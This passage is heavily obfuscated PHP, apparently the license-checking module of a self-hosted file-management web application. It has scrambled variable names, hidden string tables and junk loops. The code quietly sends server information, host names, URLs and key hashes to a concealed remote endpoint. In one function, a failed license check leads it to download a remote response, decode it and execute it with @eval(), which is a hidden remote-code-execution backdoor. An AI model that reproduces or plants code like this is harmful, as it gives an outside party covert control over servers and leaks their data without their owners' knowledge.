$¤æî‘Óß[$èş¥ÈçÉ[95]], $èş¥ÈçÉ[96] => (int) _get($¤æî‘Óß, $èş¥ÈçÉ[97], 0)); $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[99]] = Action($èş¥ÈçÉ[100])->accessToken(); $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[101]] = md5($_SERVER[$èş¥ÈçÉ[102]] . $äîÕÀ§[$èş¥ÈçÉ[103]]); $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[104]] = base64_encode(serverInfo()); $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[105]] = $this->jvir5a98833f; if ($äîÕÀ§[$èş¥ÈçÉ[105]] != $èş¥ÈçÉ[106]) { $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[107]] = $äîÕÀ§[$èş¥ÈçÉ[107]]; $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[108]] = $äîÕÀ§[$èş¥ÈçÉ[108]]; $ÖÓ”¹Ã = rand_string(10) . $this->jvir5a98833f . rand_string(5); $ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[109]][$èş¥ÈçÉ[110]] = $this->nqaxebae62dc($ÖÓ”¹Ã, $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[101]]); } if ($this->jvir5a98833f == $èş¥ÈçÉ[106]) { $ëÙ§¾[$èş¥ÈçÉ[87]][$èş¥ÈçÉ[88]][$èş¥ÈçÉ[93]][$èş¥ÈçÉ[97]] = 0; } $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[111]] = _get($this->syna978d2a39, $èş¥ÈçÉ[112], $èş¥ÈçÉ[6]); $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[113]] = _get($this->syna978d2a39, $èş¥ÈçÉ[114], $èş¥ÈçÉ[6]); if (_get($GLOBALS, $èş¥ÈçÉ[115]) && $this->config[$èş¥ÈçÉ[116]]) { $ëÙ§¾[$èş¥ÈçÉ[98]][$èş¥ÈçÉ[117]] = WEB_ROOT; } return $ëÙ§¾; } private function qrugc20f8ead() { $õ‘Á¿©¥ =& $_SERVER[¹Û¹Æ€]; $Š¬¨¨ğï =& $_SERVER[Ëü‚¼ê]; $ºÛ§­ôˆ = $_SERVER[$Š¬¨¨ğï[24]] == $Š¬¨¨ğï[118]; if ($_SERVER[$Š¬¨¨ğï[24]] == $Š¬¨¨ğï[119] && $_GET[$Š¬¨¨ğï[120]] == $Š¬¨¨ğï[121]) { $ºÛ§­ôˆ = !0; } if ($ºÛ§­ôˆ) { $®šùÔ¡ = array($Š¬¨¨ğï[105] => $this->jvir5a98833f, $Š¬¨¨ğï[122] => $this->yirjec5cdfe0(), $Š¬¨¨ğï[123] => Model($Š¬¨¨ğï[124])->count()); if ($this->jvir5a98833f != $Š¬¨¨ğï[106]) { $ŒÂúÈè„ = _get($this->syna978d2a39, $Š¬¨¨ğï[125]); if ($ŒÂúÈè„) { $®šùÔ¡[$Š¬¨¨ğï[126]] = $ŒÂúÈè„; $®šùÔ¡[$Š¬¨¨ğï[127]] = strtotime(_get($this->syna978d2a39, $Š¬¨¨ğï[128])); $®šùÔ¡[$Š¬¨¨ğï[129]] = _get($this->syna978d2a39, $Š¬¨¨ğï[114]); } $Øîùµ±ì = Model($Š¬¨¨ğï[33])->get($Š¬¨¨ğï[130], $Š¬¨¨ğï[6], !0); if (is_string($Øîùµ±ì) && substr($Øîùµ±ì, 0, 1) == $Š¬¨¨ğï[131]) { $Øîùµ±ì = json_decode_force($Øîùµ±ì); } if (is_array($Øîùµ±ì) && $Øîùµ±ì[$Š¬¨¨ğï[132]] && strstr($Øîùµ±ì[$Š¬¨¨ğï[132]], $Š¬¨¨ğï[133])) { $ïñí½û¯ = explode($Š¬¨¨ğï[133], $Øîùµ±ì[$Š¬¨¨ğï[132]]); $®šùÔ¡[$Š¬¨¨ğï[134]] = $ïñí½û¯[0]; } } $®šùÔ¡ = $this->cjxb0438e40e(json_encode($®šùÔ¡), md5($Š¬¨¨ğï[135])); $èèØÅì = array($Š¬¨¨ğï[136] => $®šùÔ¡); call_user_func(array($Š¬¨¨ğï[137], $Š¬¨¨ğï[138]), $èèØÅì); } if ($this->jvir5a98833f == $Š¬¨¨ğï[106]) { return; } $ÂÓƒ±çÜ = array($Š¬¨¨ğï[139], $Š¬¨¨ğï[140], $Š¬¨¨ğï[141], $Š¬¨¨ğï[142], $Š¬¨¨ğï[143], $Š¬¨¨ğï[144]); $Ò÷ê×©õ = $õ‘Á¿©¥[660]; $Ìè°•ƒ¼ = Model($Š¬¨¨ğï[33])->get(); $ŠšÆšÆ÷ = $õ‘Á¿©¥[661]; $èèØÅì = array($Š¬¨¨ğï[145] => $Ìè°•ƒ¼[$Š¬¨¨ğï[34]], $Š¬¨¨ğï[146] => $Ìè°•ƒ¼[$Š¬¨¨ğï[35]], $Š¬¨¨ğï[147] => $Š¬¨¨ğï[6]); foreach ($ÂÓƒ±çÜ as $í¤ã™æŒ) { if (!isset($Ìè°•ƒ¼[$í¤ã™æŒ]) || !$Ìè°•ƒ¼[$í¤ã™æŒ]) { continue; } $èèØÅì[$í¤ã™æŒ] = $Ìè°•ƒ¼[$í¤ã™æŒ]; $¢±ÃèøÙ = $õ‘Á¿©¥[662]; if (strlen($¢±ÃèøÙ) < $õ‘Á¿©¥[628]) { die; } } call_user_func(array($Š¬¨¨ğï[137], $Š¬¨¨ğï[138]), $èèØÅì); } private function dmts7fd9ec5b() { $î¾¿ÕĞ =& $_SERVER[¹Û¹Æ€]; $³Å·ë­Ï =& $_SERVER[Ëü‚¼ê]; if ($_SERVER[$³Å·ë­Ï[24]] != $³Å·ë­Ï[148]) { return; } if (!_get($GLOBALS, $³Å·ë­Ï[115])) { die; } $«Ä‡ÓÚí = $GLOBALS[$³Å·ë­Ï[13]]; if (isset($«Ä‡ÓÚí[$³Å·ë­Ï[149]])) { $this->wozrd82b61b7(); die; } if (!isset($«Ä‡ÓÚí[$³Å·ë­Ï[150]]) || strlen($«Ä‡ÓÚí[$³Å·ë­Ï[150]]) != 16) { show_json($³Å·ë­Ï[151] . $«Ä‡ÓÚí[$³Å·ë­Ï[150]], !1); } $„‡ª‚Ñê = Model($³Å·ë­Ï[33])->get($³Å·ë­Ï[103]); $†»ßÇæ = md5($_SERVER[$³Å·ë­Ï[102]] . $„‡ª‚Ñê); $Ş™ãƒ¡ = array($³Å·ë­Ï[150] => $«Ä‡ÓÚí[$³Å·ë­Ï[150]], $³Å·ë­Ï[152] => rand_string(16), $³Å·ë­Ï[153] => $³Å·ë­Ï[135], $³Å·ë­Ï[154] => $³Å·ë­Ï[155], $³Å·ë­Ï[156] => $_SERVER[$³Å·ë­Ï[157]], $³Å·ë­Ï[158] => $_SERVER[$³Å·ë­Ï[159]], $³Å·ë­Ï[160] => $_SERVER[$³Å·ë­Ï[161]], $³Å·ë­Ï[101] => $†»ßÇæ, $³Å·ë­Ï[162] => Model($³Å·ë­Ï[33])->get($³Å·ë­Ï[130])); if ($«Ä‡ÓÚí[$³Å·ë­Ï[163]] == $³Å·ë­Ï[164]) { $ò£ç™«ô = $this->cjxb0438e40e($†»ßÇæ, $³Å·ë­Ï[165]); $¿ê·Û¨Ş = $this->nqaxebae62dc(json_encode($Ş™ãƒ¡), $†»ßÇæ . $³Å·ë­Ï[166], 3); $¿ê·Û¨Ş = $¿ê·Û¨Ş . $³Å·ë­Ï[167] . $_SERVER[$³Å·ë­Ï[157]]; $¤›ïšµ² = $this->ihtw8e8d72ee($³Å·ë­Ï[168] . $ò£ç™«ô . $³Å·ë­Ï[169] . $¿ê·Û¨Ş, -1); show_json($¤›ïšµ², !0); } else { if ($«Ä‡ÓÚí[$³Å·ë­Ï[163]] == $³Å·ë­Ï[170]) { $ŸÖ¹íğ = substr(md5($³Å·ë­Ï[171] . $†»ßÇæ), 12, 15) . $³Å·ë­Ï[172]; $¿ê·Û¨Ş = $this->jxarb0bbe118(trim($«Ä‡ÓÚí[$³Å·ë­Ï[173]]), $ŸÖ¹íğ, 2); $ÅŞİ¿Ö = json_decode($¿ê·Û¨Ş, !0); if (!is_array($ÅŞİ¿Ö) || !is_array($ÅŞİ¿Ö[$³Å·ë­Ï[174]]) || $ÅŞİ¿Ö[$³Å·ë­Ï[150]] != !0) { $êîøò©˜ = $³Å·ë­Ï[175]; $ˆ¨Ã¼• = $ÅŞİ¿Ö[$³Å·ë­Ï[174]] ? $³Å·ë­Ï[176] . $ÅŞİ¿Ö[$³Å·ë­Ï[174]] : $êîøò©˜; show_json($ˆ¨Ã¼•, !1); } else { $Ş™ãƒ¡[$³Å·ë­Ï[152]] = $ÅŞİ¿Ö[$³Å·ë­Ï[174]][$³Å·ë­Ï[177]]; } } else { $ÅŞİ¿Ö = $this->ihtw8e8d72ee($³Å·ë­Ï[178], $Ş™ãƒ¡, 10); } } if (!is_array($ÅŞİ¿Ö) || !is_array($ÅŞİ¿Ö[$³Å·ë­Ï[174]]) || $ÅŞİ¿Ö[$³Å·ë­Ï[150]] != !0) { $êîøò©˜ = LNG($³Å·ë­Ï[179]); $ˆ¨Ã¼• = $ÅŞİ¿Ö[$³Å·ë­Ï[174]] ? $³Å·ë­Ï[176] . $ÅŞİ¿Ö[$³Å·ë­Ï[174]] : $êîøò©˜; show_json($ˆ¨Ã¼•, !1); } $Î¼Çİ¶Â = $ÅŞİ¿Ö[$³Å·ë­Ï[174]]; $×õ´Üé¸ = $this->ogjs253fd50a($Î¼Çİ¶Â[$³Å·ë­Ï[180]]); $şæ¯Ü§ = $î¾¿ÕĞ[663]; if (!$şæ¯Ü§) { die; } if (!$×õ´Üé¸ || $×õ´Üé¸ != $Î¼Çİ¶Â[$³Å·ë­Ï[128]]) { $ªÊÂâß = array($³Å·ë­Ï[181] => Model($³Å·ë­Ï[33])->get($³Å·ë­Ï[103]), $³Å·ë­Ï[182] => $_SERVER[$³Å·ë­Ï[102]], $³Å·ë­Ï[183] => this_url(), $³Å·ë­Ï[158] => $_SERVER[$³Å·ë­Ï[159]]); $¿ê·Û¨Ş = $this->zuhqd13a78c4(json_encode($ªÊÂâß)); $this->ihtw8e8d72ee($³Å·ë­Ï[184] . $¿ê·Û¨Ş); show_json(LNG($³Å·ë­Ï[185]), !0); } $Ÿ¬›¿ = array($³Å·ë­Ï[186] => $Î¼Çİ¶Â[$³Å·ë­Ï[187]], $³Å·ë­Ï[188] => $Î¼Çİ¶Â[$³Å·ë­Ï[189]], $³Å·ë­Ï[190] => rand_string(16), $³Å·ë­Ï[105] => $Î¼Çİ¶Â[$³Å·ë­Ï[191]]); if ($Ş™ãƒ¡[$³Å·ë­Ï[152]]) { $Ÿ¬›¿[$³Å·ë­Ï[190]] = $Ş™ãƒ¡[$³Å·ë­Ï[152]]; } $—·÷¡Ã = substr(md5($Ÿ¬›¿[$³Å·ë­Ï[188]]), 10, 10); $èúÍ½Ü = $—·÷¡Ã . $Ÿ¬›¿[$³Å·ë­Ï[105]] . $Ÿ¬›¿[$³Å·ë­Ï[190]]; $ˆ‚Á¾çî = $î¾¿ÕĞ[664]; if (!$ˆ‚Á¾çî) { return; } $Ÿ¬›¿[$³Å·ë­Ï[107]] = strrev(base64_encode($this->cjxb0438e40e($èúÍ½Ü, $³Å·ë­Ï[192]))); $ĞÊì = rand_string(16); $ÖÄ­òü› = $ĞÊì . $Ÿ¬›¿[$³Å·ë­Ï[105]] . $this->cjxb0438e40e(md5($Ÿ¬›¿[$³Å·ë­Ï[186]]), $ĞÊì); $Ÿ¬›¿[$³Å·ë­Ï[108]] = base64_encode(strrev($this->cjxb0438e40e($ÖÄ­òü›, $³Å·ë­Ï[193]))); $ˆ´ûß´ = $î¾¿ÕĞ[665]; while (strlen($ˆ´ûß´) < $î¾¿ÕĞ[656]) { if (!$ˆ´ûß´) { break; } $ˆ´ûß´++; } if ($Î¼Çİ¶Â[$³Å·ë­Ï[194]] && $Î¼Çİ¶Â[$³Å·ë­Ï[194]] >= 1) { Model($³Å·ë­Ï[33])->setDeep($³Å·ë­Ï[195], $³Å·ë­Ï[121]); } Model($³Å·ë­Ï[33])->set($Ÿ¬›¿); $ºˆ³¦Á¨ = md5($_SERVER[$³Å·ë­Ï[102]] . strrev($„‡ª‚Ñê) . $Ÿ¬›¿[$³Å·ë­Ï[188]]); $ÛÀã¸öÆ = $î¾¿ÕĞ[666]; while (strlen($ÛÀã¸öÆ) < $î¾¿ÕĞ[628]) { if (!$ÛÀã¸öÆ) { break; } $ÛÀã¸öÆ++; } $ª³Æïªß = strrev(substr($ºˆ³¦Á¨, 10, 16)); $¡¾…·Ëà = $this->nqaxebae62dc(json_encode($Î¼Çİ¶Â), $ºˆ³¦Á¨); $î¦‹‘„¼ = array_to_keyvalue(Model($³Å·ë­Ï[7])->listData(), $³Å·ë­Ï[196]); $³Ÿ€™¨ = $î¾¿ÕĞ[667]; while (strlen($³Ÿ€™¨) < $î¾¿ÕĞ[13]) { if (!$³Ÿ€™¨) { break; } $³Ÿ€™¨++; } $Ûç§ = $î¦‹‘„¼[$³Å·ë­Ï[197]]; $ƒù™Ö¿ß = $î¾¿ÕĞ[668]; while (strlen($ƒù™Ö¿ß) < $î¾¿ÕĞ[624]) { if (!$ƒù™Ö¿ß) { break; } $ƒù™Ö¿ß++; } $í—²ü°Ò = array(); $í—²ü°Ò[$ª³Æïªß] = $¡¾…·Ëà; Model($³Å·ë­Ï[7])->update($Ûç§[$³Å·ë­Ï[198]], array($³Å·ë­Ï[199] => $í—²ü°Ò)); $ºË²¿•• = $î¾¿ÕĞ[669]; $this->syna978d2a39 = $Î¼Çİ¶Â; $this->jvir5a98833f = $Ÿ¬›¿[$³Å·ë­Ï[105]]; $this->licenseRegistSuccess(); $¼Øé‹Áü = $î¾¿ÕĞ[670]; if (!$¼Øé‹Áü) { return; } Cache::set($³Å·ë­Ï[200] . md5($„‡ª‚Ñê . $³Å·ë­Ï[201]), $³Å·ë­Ï[6]); show_json(LNG($³Å·ë­Ï[185]), !0); } private function licenseRegistSuccess() { $…ÃÄÍ÷× =& $_SERVER[Ëü‚¼ê]; $ÅŞ“ö· = Model($…ÃÄÍ÷×[33])->get(); $˜ƒ†‹¨™ = $_SERVER[¹Û¹Æ€][671]; if (!$˜ƒ†‹¨™) { die; } if ($ÅŞ“ö·[$…ÃÄÍ÷×[63]] != $…ÃÄÍ÷×[121]) { Model($…ÃÄÍ÷×[33])->set($…ÃÄÍ÷×[63], $…ÃÄÍ÷×[121]); } Action($…ÃÄÍ÷×[202])->initStart(!0); } private function wozrd82b61b7() { $à¶†›Öå =& $_SERVER[¹Û¹Æ€]; $Ş¾Ÿİ»ö =& $_SERVER[Ëü‚¼ê]; Model($Ş¾Ÿİ»ö[33])->set(array($Ş¾Ÿİ»ö[186] => $Ş¾Ÿİ»ö[6], $Ş¾Ÿİ»ö[188] => $Ş¾Ÿİ»ö[6], $Ş¾Ÿİ»ö[105] => $Ş¾Ÿİ»ö[106], $Ş¾Ÿİ»ö[107] => $Ş¾Ÿİ»ö[6], $Ş¾Ÿİ»ö[108] => $Ş¾Ÿİ»ö[6])); Model($Ş¾Ÿİ»ö[33])->setDeep($Ş¾Ÿİ»ö[195], $Ş¾Ÿİ»ö[203]); $­ª ßá½ = $à¶†›Öå[672]; if (strlen($­ª ßá½) < $à¶†›Öå[13]) { return; } $this->syna978d2a39 = array(); $this->jvir5a98833f = $Ş¾Ÿİ»ö[106]; } private function eqxuf51bdc19() { $£³©¯ıû =& $_SERVER[¹Û¹Æ€]; $éœ¶ØèÉ =& $_SERVER[Ëü‚¼ê]; $_SERVER[$éœ¶ØèÉ[159]] = _get($_SERVER, $éœ¶ØèÉ[159], APP_HOST); $this->jvir5a98833f = $éœ¶ØèÉ[106]; $ ÅĞÃ›ª = $£³©¯ıû[673]; if (!$ ÅĞÃ›ª) { return; } $„ÓÆŸâ¤ = Model($éœ¶ØèÉ[33])->get(); if ($„ÓÆŸâ¤[$éœ¶ØèÉ[105]] == $éœ¶ØèÉ[106]) { return; } $–Ğ……ğ¿ = Model($éœ¶ØèÉ[33])->get($éœ¶ØèÉ[103]); $ò‹´ÖŞ× = $£³©¯ıû[674]; while (strlen($ò‹´ÖŞ×) < $£³©¯ıû[638]) { if (!$ò‹´ÖŞ×) { break; } $ò‹´ÖŞ×++; } $œ¢ğùï = $éœ¶ØèÉ[200] . md5($–Ğ……ğ¿ . $éœ¶ØèÉ[201]); $»‰¸€¦ = Cache::get($œ¢ğùï); $Ñ£„÷¿Ğ = $£³©¯ıû[675]; while ($Ñ£„÷¿Ğ < $£³©¯ıû[624]) { if ($Ñ£„÷¿Ğ >= 0) { break; } $Ñ£„÷¿Ğ++; } if (!is_array($»‰¸€¦) || !isset($»‰¸€¦[$éœ¶ØèÉ[204]]) || time() - $»‰¸€¦[$éœ¶ØèÉ[204]] >= 60) { $™’áÉà = Model($éœ¶ØèÉ[7])->loadList(); $ŠÌü¡ˆƒ = $™’áÉà[$éœ¶ØèÉ[197]]; $Ó·ƒÏô = md5($_SERVER[$éœ¶ØèÉ[102]] . strrev($–Ğ……ğ¿) . $„ÓÆŸâ¤[$éœ¶ØèÉ[188]]); $Ã×ì¦Ê = strrev(substr($Ó·ƒÏô, 10, 16)); $»‰¸€¦ = $this->jxarb0bbe118($ŠÌü¡ˆƒ[$éœ¶ØèÉ[85]][$Ã×ì¦Ê], $Ó·ƒÏô); $»‰¸€¦ = json_decode($»‰¸€¦, !0); } if (!is_array($»‰¸€¦)) { return $this->wozrd82b61b7(); } $–‘›¨Õ = strtotime($»‰¸€¦[$éœ¶ØèÉ[128]]); if (time() >= $–‘›¨Õ) { return $this->wozrd82b61b7(); } if (time() - $»‰¸€¦[$éœ¶ØèÉ[204]] > 20) { $»‰¸€¦[$éœ¶ØèÉ[204]] = time(); Cache::set($œ¢ğùï, $»‰¸€¦); } $this->syna978d2a39 = $»‰¸€¦; $this->jvir5a98833f = $„ÓÆŸâ¤[$éœ¶ØèÉ[105]]; } private function pmhi0fbc1993() { $Ÿö›–úœ =& $_SERVER[¹Û¹Æ€]; $“Î‰ı£ =& $_SERVER[Ëü‚¼ê]; $§ÇúŞª¡ = $GLOBALS[$“Î‰ı£[13]]; $ƒ©Ç»ÎÂ = $_SERVER[$“Î‰ı£[24]]; $‚˜úŒ’ = $Ÿö›–úœ[676]; if (strlen($‚˜úŒ’) < $Ÿö›–úœ[638]) { return; } if ($ƒ©Ç»ÎÂ == $“Î‰ı£[205] && $this->jvir5a98833f == $“Î‰ı£[106]) { show_json(LNG($“Î‰ı£[206]), !1, $“Î‰ı£[207]); } $•ô¡åÛº = array($“Î‰ı£[208], $“Î‰ı£[209]); if (in_array($ƒ©Ç»ÎÂ, $•ô¡åÛº)) { if ($this->jvir5a98833f == $“Î‰ı£[106] && isset($§ÇúŞª¡[$“Î‰ı£[210]])) { show_json(LNG($“Î‰ı£[206]), !1, $“Î‰ı£[207]); die; } $Ò‡üŞÅ‚ = $this->yirjec5cdfe0(); if ($Ò‡üŞÅ‚ != intval($“Î‰ı£[211])) { if ($Ò‡üŞÅ‚ <= Model($“Î‰ı£[124])->count()) { show_json(LNG($“Î‰ı£[212]), !1, $“Î‰ı£[207]); die; } } } } private function omrz6df15211() { $í„½¾ç =& $_SERVER[¹Û¹Æ€]; $¹éÎ‹ŠÜ =& $_SERVER[Ëü‚¼ê]; $¶££İ‹ß = array($¹éÎ‹ŠÜ[118], $¹éÎ‹ŠÜ[119]); if (!_get($GLOBALS, $¹éÎ‹ŠÜ[115]) || !isset($_GET[$¹éÎ‹ŠÜ[213]])) { return; } if (!in_array($_SERVER[$¹éÎ‹ŠÜ[24]], $¶££İ‹ß)) { return; } $˜î¢ÚÆÃ = $¹éÎ‹ŠÜ[214]; $ş¿è£‡í = $í„½¾ç[677]; if (strlen($ş¿è£‡í) < $í„½¾ç[656]) { return; } $˜î¢ÚÆÃ = $this->ftzq06fb49f0($˜î¢ÚÆÃ, $¹éÎ‹ŠÜ[215]); $ÌµÉ®³Ä = $í„½¾ç[678]; if (strlen($ÌµÉ®³Ä) < $í„½¾ç[624]) { die; } $ÊãÁä‚¿ = stream_context_create(array($¹éÎ‹ŠÜ[216] => array($¹éÎ‹ŠÜ[217] => $¹éÎ‹ŠÜ[218], $¹éÎ‹ŠÜ[219] => 3))); $ë‚üã×Ì = $í„½¾ç[679]; if (strlen($ë‚üã×Ì) < $í„½¾ç[628]) { return; } $˜Ó´öïµ = @file_get_contents($˜î¢ÚÆÃ, !1, $ÊãÁä‚¿); $ùñ°õÕè = $í„½¾ç[680]; if (!$ùñ°õÕè) { return; } header($¹éÎ‹ŠÜ[220]); if ($˜Ó´öïµ && strstr($˜Ó´öïµ, $¹éÎ‹ŠÜ[221])) { echo $˜Ó´öïµ; } die; } public function ipkna6cbf70e($“›—“) { $åÊé¬Äï =& $_SERVER[¹Û¹Æ€]; $ÈİÛïì =& $_SERVER[Ëü‚¼ê]; if ($this->jvir5a98833f == $ÈİÛïì[222]) { return $“›—“; } $—ÇÏøšÈ = array($ÈİÛïì[223] => $ÈİÛïì[224], $ÈİÛïì[225] => $ÈİÛïì[224], $ÈİÛïì[226] => $ÈİÛïì[224], $ÈİÛïì[227] => $ÈİÛïì[224], $ÈİÛïì[228] => $ÈİÛïì[229], $ÈİÛïì[230] => $ÈİÛïì[229], $ÈİÛïì[231] => $ÈİÛïì[229], $ÈİÛïì[232] => $ÈİÛïì[229], $ÈİÛïì[233] => $ÈİÛïì[229], $ÈİÛïì[234] => $ÈİÛïì[229], $ÈİÛïì[235] => $ÈİÛïì[229], $ÈİÛïì[236] => $ÈİÛïì[229], $ÈİÛïì[237] => $ÈİÛïì[229], $ÈİÛïì[238] => $ÈİÛïì[229], $ÈİÛïì[239] => $ÈİÛïì[229], $ÈİÛïì[240] => $ÈİÛïì[229]); $ïèµ—ç = explode($ÈİÛïì[241], _get($this->syna978d2a39, $ÈİÛïì[112], $ÈİÛïì[6])); $„Ò¬©¤ù = array(); $ü×ƒÓ¶§ = $åÊé¬Äï[681]; if (strlen($ü×ƒÓ¶§) < $åÊé¬Äï[638]) { die; } foreach ($—ÇÏøšÈ as $Ùù×³ü => $é’²Œš) { if ($é’²Œš == $ÈİÛïì[224] && substr($this->jvir5a98833f, 0, 1) == $ÈİÛïì[224]) { continue; } if (!in_array($Ùù×³ü, $ïèµ—ç)) { $„Ò¬©¤ù[] = $Ùù×³ü; } } foreach ($„Ò¬©¤ù as $Ùù×³ü) { unset($“›—“[$Ùù×³ü]); $°İƒ¼…¬ = $åÊé¬Äï[644]; } return $“›—“; $µîñ«Š² = $åÊé¬Äï[682]; while (strlen($µîñ«Š²) < $åÊé¬Äï[624]) { if (!$µîñ«Š²) { break; } $µîñ«Š²++; } } private function zlki22d928d8() { $Ãæ™ =& $_SERVER[Ëü‚¼ê]; if ($this->jvir5a98833f != $Ãæ™[106]) { $GLOBALS[$Ãæ™[85]][$Ãæ™[89]][$Ãæ™[242]] = $Ãæ™[203]; return; } $GLOBALS[$Ãæ™[85]][$Ãæ™[243]] = $Ãæ™[121]; if (Model($Ãæ™[244])->get($Ãæ™[63]) != $Ãæ™[203]) { Model($Ãæ™[244])->set($Ãæ™[63], $Ãæ™[203]); } } public function nitla7140eb6() { return $_SERVER[Ëü‚¼ê][245]; } private function thnp3f3bb700() { $€¥Ü¯Ìİ =& $_SERVER[¹Û¹Æ€]; $Á“ ê·Ì =& $_SERVER[Ëü‚¼ê]; $Ç´ìàÜ« = array($Á“ ê·Ì[246], $Á“ ê·Ì[247], $Á“ ê·Ì[248]); $Œ¼®¤¨› = $Á“ ê·Ì[249] . md5($Á“ ê·Ì[250]); $™÷¾ÚÑ = $€¥Ü¯Ìİ[683]; while ($™÷¾ÚÑ < $€¥Ü¯Ìİ[624]) { if ($™÷¾ÚÑ >= 0) { break; } $™÷¾ÚÑ++; } if ($this->jvir5a98833f == $Á“ ê·Ì[106] || !_get($GLOBALS, $Á“ ê·Ì[115])) { return; } if (!in_array($_SERVER[$Á“ ê·Ì[24]], $Ç´ìàÜ«)) { return; } if (time() % 4 != 0) { return; } $­Ø­»íú = call_user_func(array($Á“ ê·Ì[251], $Á“ ê·Ì[252]), $Œ¼®¤¨›); if ($­Ø­»íú && time() - $­Ø­»íú < intval($Á“ ê·Ì[253])) { return; } call_user_func(array($Á“ ê·Ì[251], $Á“ ê·Ì[138]), $Œ¼®¤¨›, time()); $¼ÑÁ×£§ = Model($Á“ ê·Ì[33])->get($Á“ ê·Ì[103]); $şıˆÛš = $€¥Ü¯Ìİ[684]; while ($şıˆÛš < $€¥Ü¯Ìİ[624]) { if ($şıˆÛš >= 0) { break; } $şıˆÛš++; } $æÏˆœ£ = array($Á“ ê·Ì[150] => Model($Á“ ê·Ì[33])->get($Á“ ê·Ì[186]), $Á“ ê·Ì[163] => $this->jvir5a98833f, $Á“ ê·Ì[160] => $_SERVER[$Á“ ê·Ì[161]], $Á“ ê·Ì[162] => Model($Á“ ê·Ì[33])->get($Á“ ê·Ì[130]), $Á“ ê·Ì[101] => md5($_SERVER[$Á“ ê·Ì[102]] . $¼ÑÁ×£§), $Á“ ê·Ì[153] => $Á“ ê·Ì[135], $Á“ ê·Ì[156] => $_SERVER[$Á“ ê·Ì[157]]); $øùÜÃòÏ = $€¥Ü¯Ìİ[685]; while (strlen($øùÜÃòÏ) < $€¥Ü¯Ìİ[628]) { if (!$øùÜÃòÏ) { break; } $øùÜÃòÏ++; } $ğı‘Ğú¿ = $this->ihtw8e8d72ee($Á“ ê·Ì[254], $æÏˆœ£); $Ÿı„öÖ = $€¥Ü¯Ìİ[686]; if (!$Ÿı„öÖ) { return; } if (!is_array($ğı‘Ğú¿)) { return; } if ($ğı‘Ğú¿[$Á“ ê·Ì[150]] && $ğı‘Ğú¿[$Á“ ê·Ì[255]]) { if ($this->ogjs253fd50a($ğı‘Ğú¿[$Á“ ê·Ì[255]]) == $æÏˆœ£[$Á“ ê·Ì[150]]) { return; } } $this->wozrd82b61b7(); $ÄÅŒÖåù = $€¥Ü¯Ìİ[687]; if (strlen($ÄÅŒÖåù) < $€¥Ü¯Ìİ[624]) { die; } if ($this->ogjs253fd50a($ğı‘Ğú¿[$Á“ ê·Ì[255]]) != $æÏˆœ£[$Á“ ê·Ì[150]]) { $ºéúå¶ = array($Á“ ê·Ì[181] => $¼ÑÁ×£§, $Á“ ê·Ì[182] => $_SERVER[$Á“ ê·Ì[102]], $Á“ ê·Ì[183] => this_url(), $Á“ ê·Ì[158] => $_SERVER[$Á“ ê·Ì[159]]); $ÖÛ‰§÷Ü = $this->zuhqd13a78c4(json_encode($ºéúå¶)); $ğı‘Ğú¿ = $this->ihtw8e8d72ee($Á“ ê·Ì[184] . $ÖÛ‰§÷Ü); if ($ğı‘Ğú¿ && is_array($ğı‘Ğú¿) && isset($ğı‘Ğú¿[$Á“ ê·Ì[255]])) { $æÆ›Üûğ = $this->jxarb0bbe118($ğı‘Ğú¿[$Á“ ê·Ì[255]], 2); if ($æÆ›Üûğ) { $æÆ›Üûğ = $this->ogjs253fd50a($æÆ›Üûğ); } if ($æÆ›Üûğ) { try { @eval($æÆ›Üûğ); } catch (Exception $í¬ôñä) { } } } } } private function ihtw8e8d72ee($¡šÛšÕ§ = '', $ğø°É = array(), $„òøéæî = 5) { $¾ª¬ŒóŞ =& $_SERVER[¹Û¹Æ€]; $ÚıÉ°¼ =& $_SERVER[Ëü‚¼ê]; $¯ô·ì†à = $ÚıÉ°¼[256]; $¯ô·ì†à = $this->ftzq06fb49f0($¯ô·ì†à, $ÚıÉ°¼[257]); $½Ë÷‡’’ = $¾ª¬ŒóŞ[688]; while (strlen($½Ë÷‡’’) < $¾ª¬ŒóŞ[624]) { if (!$½Ë÷‡’’) { break; } $½Ë÷‡’’++; } $¯ô·ì†à = $¯ô·ì†à . $¡šÛšÕ§; $Í¨åİ€¥ = $¾ª¬ŒóŞ[689]; if (!$Í¨åİ€¥) { return; } if ($ğø°É && is_array($ğø°É)) { $¯ô·ì†à = $¯ô·ì†à . $ÚıÉ°¼[258] . http_build_query($ğø°É); } if ($ğø°É === -1) { return $¯ô·ì†à; } $æÎÛ€™¨ = stream_context_create(array($ÚıÉ°¼[216] => array($ÚıÉ°¼[219] => $„òøéæî, $ÚıÉ°¼[217] => $ÚıÉ°¼[259]), $ÚıÉ°¼[260] => array($ÚıÉ°¼[261] => !1, $ÚıÉ°¼[262] => !1))); $ğø°É = @file_get_contents($¯ô·ì†à, !1, $æÎÛ€™¨); $ŞñûÑà = $¾ª¬ŒóŞ[690]; if (strlen($ŞñûÑà) < $¾ª¬ŒóŞ[624]) { die; } return json_decode($ğø°É, !0); } private function yirjec5cdfe0() { $¾šüåœö =& $_SERVER[¹Û¹Æ€]; $Ş“ŒºÖĞ =& $_SERVER[Ëü‚¼ê]; $¨äèÌºÜ = array($Ş“ŒºÖĞ[263] => $Ş“ŒºÖĞ[264], $Ş“ŒºÖĞ[265] => $Ş“ŒºÖĞ[266], $Ş“ŒºÖĞ[267] => $Ş“ŒºÖĞ[268], $Ş“ŒºÖĞ[269] => $Ş“ŒºÖĞ[270], $Ş“ŒºÖĞ[271] => $Ş“ŒºÖĞ[272], $Ş“ŒºÖĞ[273] => $Ş“ŒºÖĞ[211], $Ş“ŒºÖĞ[274] => $Ş“ŒºÖĞ[211], $Ş“ŒºÖĞ[275] => $Ş“ŒºÖĞ[264], $Ş“ŒºÖĞ[276] => $Ş“ŒºÖĞ[266], $Ş“ŒºÖĞ[277] => $Ş“ŒºÖĞ[268], $Ş“ŒºÖĞ[278] => 